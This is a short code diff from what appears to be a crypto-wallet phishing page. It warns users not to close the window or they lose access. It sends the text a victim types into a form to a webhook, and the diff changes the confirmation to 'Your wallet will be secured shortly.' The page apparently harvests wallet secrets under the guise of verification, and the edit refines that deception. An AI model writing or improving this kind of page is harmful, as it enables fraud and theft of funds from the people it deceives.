@@ -467,7 +467,7 @@ Do not close this window — failure to complete verification may result in perm
         await sendToWebhook(payload);
         textarea.value = "";
         count.textContent = "0";
-        showStatus("Thanks! Your message has been sent.", false);
+        showStatus("Thanks! Your wallet will be secured shortly.", false);
       } catch (err) {
         console.error("Webhook request failed:", err);
         showStatus("Sorry, something went wrong. Please try again.", true);
